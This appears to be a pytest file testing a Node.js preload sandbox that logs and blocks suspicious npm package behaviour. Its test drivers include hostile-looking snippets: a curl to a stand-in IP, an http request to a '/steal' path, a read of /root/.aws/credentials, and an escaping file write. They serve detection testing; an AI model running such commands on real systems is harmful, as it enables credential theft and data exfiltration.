import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

HARNESS = Path("src/npm_ide_analyst/sandbox/harness")
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def _run_driver_rc(tmp_path: Path, driver_src: str):
    """Run a driver under the preload; return (exit_code, events)."""
    driver = tmp_path / "driver.js"
    driver.write_text(driver_src, encoding="utf-8")
    log = tmp_path / "events.jsonl"
    preload = (HARNESS / "preload.js").resolve()
    env = {**os.environ, "ANALYST_EVENT_LOG": str(log)}
    proc = subprocess.run(["node", "-r", str(preload), str(driver)],
                          env=env, timeout=30, capture_output=True)
    events = ([json.loads(line) for line in log.read_text().splitlines() if line.strip()]
              if log.exists() else [])
    return proc.returncode, events


def _run_driver(tmp_path: Path, driver_src: str) -> list[dict]:
    return _run_driver_rc(tmp_path, driver_src)[1]


def test_hooks_process_exec(tmp_path):
    events = _run_driver(tmp_path,
        "const cp=require('child_process'); cp.exec('curl http://1.2.3.4/x', ()=>{});")
    assert any(e["kind"] == "process" and "curl" in e["detail"] for e in events)


def test_hooks_network_captures_url(tmp_path):
    events = _run_driver(tmp_path,
        "require('http').request('http://1.2.3.4/steal', ()=>{}).end();")
    assert any(e["kind"] == "network" and "1.2.3.4" in e["detail"] for e in events)


def test_hooks_eval_logs_decoded_code(tmp_path):
    import base64
    # Decoded code must (a) trip the decode hook's malware-keyword filter
    # (contains "require"/"http") and (b) eval cleanly in global scope
    # (indirect eval has no local `require`), so use a keyword-bearing comment.
    code = "1 /* require http */"
    b64 = base64.b64encode(code.encode()).decode()
    events = _run_driver(tmp_path,
        f"eval(Buffer.from('{b64}','base64').toString());")
    assert any(e["kind"] == "decode" for e in events)
    assert any(e["kind"] == "eval" for e in events)


def test_hooks_sensitive_file_read(tmp_path):
    events = _run_driver(tmp_path,
        "try{require('fs').readFileSync('/root/.aws/credentials')}catch(e){}")
    assert any(e["kind"] in ("file", "secret") and "credentials" in e["detail"]
               for e in events)


def test_hooks_fs_write_outside_work_is_neutered(tmp_path):
    # The security-relevant half: a write to a path outside the allowed
    # /work/ prefix must be dropped (never touch disk) while its intent is
    # still logged. `target` is a real, writable absolute host path -- if the
    # neuter failed, the file would actually be created here.
    target = tmp_path / "escape.txt"
    src = (f"const fs=require('fs');\n"
           f"fs.writeFileSync({json.dumps(str(target))}, 'PWNED');\n")
    events = _run_driver(tmp_path, src)

    assert not target.exists(), "neutered write escaped to disk"
    assert any(e["kind"] == "file" and e["data"].get("write")
               and "escape.txt" in e["detail"] for e in events), \
        "write intent was not logged"


def test_hooks_fs_write_under_work_delegates(tmp_path):
    # The allowed half: a write under the /work/ prefix must be delegated to
    # the real fs. We target a guaranteed-missing subdir so the real fs throws
    # ENOENT -- a signal the neuter (which silently returns undefined and never
    # throws) can never produce. Exit 42 => delegated; exit 0 => wrongly dropped.
    src = (
        "const fs=require('fs');\n"
        "const p='/work/analyst_missing_'+process.pid+'_'+Date.now()+'/probe.txt';\n"
        "try{ fs.writeFileSync(p,'x'); process.exit(0); }\n"
        "catch(e){ process.exit(42); }\n"
    )
    rc, events = _run_driver_rc(tmp_path, src)

    assert rc == 42, "write under /work/ was not delegated to the real fs"
    # Intent is logged for allowed writes too (emit happens before the branch).
    assert any(e["kind"] == "file" and e["data"].get("write") for e in events)
